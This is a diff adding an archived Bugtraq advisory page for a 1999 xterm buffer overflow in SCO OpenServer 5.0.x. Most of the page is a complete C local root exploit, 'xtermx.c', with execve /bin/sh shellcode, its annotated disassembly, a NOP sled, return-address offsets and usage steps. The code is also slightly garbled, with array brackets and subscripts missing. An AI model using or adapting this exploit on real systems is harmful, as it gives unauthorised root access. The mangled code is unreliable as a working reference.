@@ -1,0 +1,107 @@
+<p><b><span style="font-size: 18pt;">SCO OpenServer XBase Buffer Overflow Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/479/info">info</a><br><a href="http://www.securityfocus.com/bid/479/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/479/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/479/solution">solution</a><br><a href="http://www.securityfocus.com/bid/479/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				479
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 14 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 14 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by doble &lt;doble@INAME.COM&gt; on June 14, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SCO Open Server 5.0.5 <br/>
+					
+				
+					SCO Open Server 5.0.4 <br/>
+					
+				
+					SCO Open Server 5.0.3 <br/>
+					
+				
+					SCO Open Server 5.0.2 <br/>
+					
+				
+					SCO Open Server 5.0.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	/*<br/> * &lt;xtermx.c&gt; Local root exploit <br/> *<br/> * Offset: xterm (SCO OpenServer 5.0.4)<br/> * 0 -&gt; From an open scoterm (without display parameter)<br/> * 2000 -&gt; From remote telnet (with display parameter)<br/> *<br/> * Usage: <br/> * $ cc xtermx.c -o xtermx<br/> * $ scoterm <br/> * $ /usr/bin/X11/xterm -bg `xtermx`<br/> *                      or<br/> * $ /usr/bin/X11/xterm -display 1.1.1.1:0 -bg `xtermx 2000`<br/> *<br/> * Note: xterm need to be run from a valid x-display<br/> *<br/> * By: The Dark Raver of CPNE (Murcia/Spain - 22/6/99) <br/> *<br/>*<br/> * &lt;http://members.tripod.com/~ochodedos&gt; - &lt;doble@iname.com&gt;<br/> *<br/> */ <br/><br/>#include &lt;stdlib.h&gt;<br/>#include &lt;stdio.h&gt;<br/><br/><br/>char hell=<br/>"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"<br/>"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"<br/>"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";<br/><br/>/*<br/>char hell=<br/>"\xeb\x1b" // start: jmp uno <br/>"\x5e" // dos: popl %esi<br/>"\x31\xdb" // xorl %ebx,%ebx<br/>"\x89\x5e\x07" // movb %bl,0x7(%esi)<br/>"\x89\x5e\x0c" // movl %ebx,0x0c(%esi)<br/>"\x88\x5e\x11" // movb %bl,0x11(%esi)<br/>"\x31\xc0" // xorl %eax,%eax<br/>"\xb0\x3b" // movb $0x3b,%al<br/>"\x8d\x7e\x07" // leal 0x07(%esi),%edi<br/>"\x89\xf9" // movl %edi,%ecx<br/>"\x53" // pushl %ebx<br/>"\x51" // pushl %ecx<br/>"\x56" // pushl %esi<br/>"\x56" // pushl %esi<br/>"\xeb\x10" // jmp execve<br/>"\xe8\xe0\xff\xff\xff" // uno: call dos<br/>"/bin/sh"<br/>"\xaa\xaa\xaa\xaa"<br/>"\x9a\xaa\xaa\xaa\xaa\x07\xaa"; // execve: lcall 0x7,0x0 <br/>*/<br/><br/> <br/>#define OFF 0x80471ff   // SCO OpenServer 5.0.4<br/>#define ALINEA 0<br/>#define LEN 2000<br/> <br/><br/>int main(int argc, char *argv) {<br/><br/>int offset=0;<br/>char bufLEN;<br/>int i;<br/><br/>if(argc &lt; 2) {<br/>        printf("Usage: xtermx offset\n"); }<br/>else {<br/>        offset=atoi(argv1); }<br/><br/>memset(buf,0x90,LEN);<br/>memcpy(buf+1000,hell,strlen(hell));<br/>for(i=1100+ALINEA;i&lt;LEN-4;i+=4)<br/>        *(int *)&amp;bufi=OFF+offset;<br/><br/>for(i=0;i&lt;LEN;i++)<br/>        putchar(bufi);<br/><br/>exit(0);<br/>}
+	
+		<ul>
+</ul>
+</div>
